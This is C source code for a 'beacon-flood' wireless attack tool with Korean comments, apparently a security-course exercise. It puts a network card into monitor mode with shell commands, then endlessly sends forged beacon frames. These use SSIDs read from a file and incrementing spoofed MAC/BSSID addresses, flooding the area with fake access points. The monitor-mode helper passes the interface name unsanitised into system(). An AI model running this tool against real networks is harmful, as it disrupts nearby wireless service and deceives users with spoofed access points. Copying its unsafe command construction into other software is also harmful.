#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include "beacon.cpp"
#define NULL 0x00

void usage(){
    printf("syntax: beacon-flood <interface> <ssidFile>\n");
    printf("sample: beacon-flood wlan0 ssid-list.txt\n");
}

void monitor(char * dev){ // 랜카드 모니터 모드로 변경 함수
    char command[100];
    sprintf(command, "ifconfig %s down",dev);
    system(command);
    sprintf(command, "iwconfig %s mode monitor",dev);
    system(command);
    sprintf(command, "ifconfig %s up",dev);
    system(command);
}

void * byte2str_MAC(uint8_t *byteMAC,char *strMAC){
    sprintf(strMAC,"%02x:%02x:%02x:%02x:%02x:%02x",byteMAC[0],byteMAC[1],byteMAC[2],byteMAC[3], byteMAC[4],byteMAC[5]);
}

void set_sMAC(struct beacon_frame * fake_bframe){
    if(fake_bframe->beacon.shost[5] == 0xff){
        fake_bframe->beacon.shost[5] = 0x00;
        fake_bframe->beacon.shost[4]++;
        if(fake_bframe->beacon.shost[4]==0xff){
            fake_bframe->beacon.shost[4] = 0x00;
            fake_bframe->beacon.shost[3]++;
            if(fake_bframe->beacon.shost[3]==0xff){
                fake_bframe->beacon.shost[3] = 0x00;
                fake_bframe->beacon.shost[2]++;
                if(fake_bframe->beacon.shost[2]==0xff){
                    fake_bframe->beacon.shost[2] = 0x00;
                    fake_bframe->beacon.shost[1]++;
                    if(fake_bframe->beacon.shost[1]==0xff){
                        fake_bframe->beacon.shost[1] = 0x00;
                        fake_bframe->beacon.shost[0]++;
                    }
                }
            }
        }
    }
    fake_bframe->beacon.shost[5]++;
    memcpy(fake_bframe->beacon.bssid, fake_bframe->beacon.shost, 6);
}

int set_ssidName(FILE* pFile, struct beacon_frame * fake_bframe){
    char ssidName[32];
    memset(ssidName,0x00,32);
    if(!feof(pFile)) fgets(ssidName, sizeof(ssidName),pFile);
    else fseek(pFile,0,SEEK_SET);
    if (ssidName[0]==0x00) return -1; //ssid가 비어있으면 continue
    ssidName[strlen(ssidName)-1] = 0x00;
    memcpy(fake_bframe->tag_ssid.ssid, ssidName, 32);
    return 0;
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        usage();
        return 0;
    }
    char * dev = argv[1];
    char * ssidFile = argv[2];
    char errbuf[PCAP_ERRBUF_SIZE];

    if(strlen(dev)>30){ // 버퍼 오버플로우 방지
        printf("interface name length less than 30 characters");
        return -1;
    }
    monitor(dev);

    pcap_t* pcap = pcap_open_live(dev , BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
        return -1;
    }

    FILE* pFile = fopen(ssidFile, "rb");
    if (pFile == NULL){
        printf("File not Found!\n");
        return -1;
    }

    struct beacon_frame fake_bframe;
    while (1) {
        set_sMAC(&fake_bframe);
        if (set_ssidName(pFile, &fake_bframe) == -1) continue;

        if (pcap_sendpacket(pcap, (unsigned char*)&fake_bframe, sizeof(fake_bframe)) != 0){
            printf("Fail sendpacket\n");
            exit (-1);
        }
        unsigned char strMAC[18] = {0,};
        byte2str_MAC(fake_bframe.beacon.bssid, (char *)strMAC);
        printf(" [BSSID]: %s | [SSID]: %s | send packet!\n", strMAC, fake_bframe.tag_ssid.ssid);
        usleep(100);
    }

    fclose(pFile);
    pcap_close(pcap);
}
